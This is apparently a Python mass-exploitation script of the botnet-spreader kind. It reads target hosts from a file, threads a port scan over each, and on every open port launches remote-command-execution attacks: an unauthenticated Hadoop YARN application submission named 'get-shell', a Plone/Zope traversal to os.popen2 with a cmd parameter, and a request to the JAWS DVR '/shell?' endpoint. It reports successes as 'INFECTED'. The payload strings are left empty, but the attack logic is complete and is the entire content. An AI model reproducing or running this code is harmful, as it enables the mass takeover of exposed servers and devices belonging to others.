import socket
import sys
import requests
import threading
import time
import random

ports = [80, 8088, 85, 5555, 6000, 7001, 7171, 7457, 11300, 25565, 70, 137, 548, 666, 873, 8000, 1099, 3306, 8888, 6001, 60001, 50000, 9000, 10000, 8181, 3702, 37215, 4550, 5511, 5550, 6550, 8866, 5500]
plonepayload = "" 
yarnPayload = ""
def portScan(host):
 try:
  website = host.replace("http://", "")
  for i in range(len(ports)):
    sockfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    location = (website, int(ports[i]))
    sockfd.settimeout(3)
    result = sockfd.connect_ex(location)
    if result == 0:
      print("OPEN PORT [" + str(ports[i]) + "] IP: [" + website + "]")
      if i == i:
        yarn(host)
        print("started yarn")
        jawss(website, ports[i])
        print("started jaws")
        plone(website, ports[i])
        print("started plone")
        sockfd.close()
    else:
      sockfd.close()
 except:
   pass
def plone(ip, port):
  try:
    url = ip + ":"+str(port)+"/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=" + plonepayload
    RES = requests.get(url, timeout=8)
    if RES.status_code == 200:
      print ("[PLONE] Loading: %s"%(ip))
      print(RES.content)
  except:
    pass
def yarn(host):
    try:
      url = host + ':8088/ws/v1/cluster/apps/new-application'
      resp = requests.post(url, timeout=3)
      app_id = resp.json()['application-id']
      url = 'http://' + host + ':8088/ws/v1/cluster/apps'
      data = {
            'application-id': app_id,
            'application-name': 'get-shell',
            'am-container-spec': {
                'commands': {
                    'command': '%s' % yarnPayload,
                },
            },
            'application-type': 'YARN',
        }
      res = requests.post(url, json=data, timeout=3)
      if res.status_code == 200:
        print("INFECTED YARN...")
    except:
        pass
    return
def jawss(ip, port):
  url = "http://" + ip + ":" + str(port) + "/shell?"
  resp = requests.get(url)
  if resp.status_code == 200:
    print("[JAWS] INFECTED " + ip + ":" + str(port))
  else:
    print("[JAWS] FAILED " + ip + ":" + str(port))
jenkins = open(sys.argv[1], "r").read().replace("\r", "").split("\n")
for ix in jenkins:
    print(ix)
    host = "http://" + ix
    x = threading.Thread(target=portScan, args=[host,])
    x.start()
    time.sleep(0.05)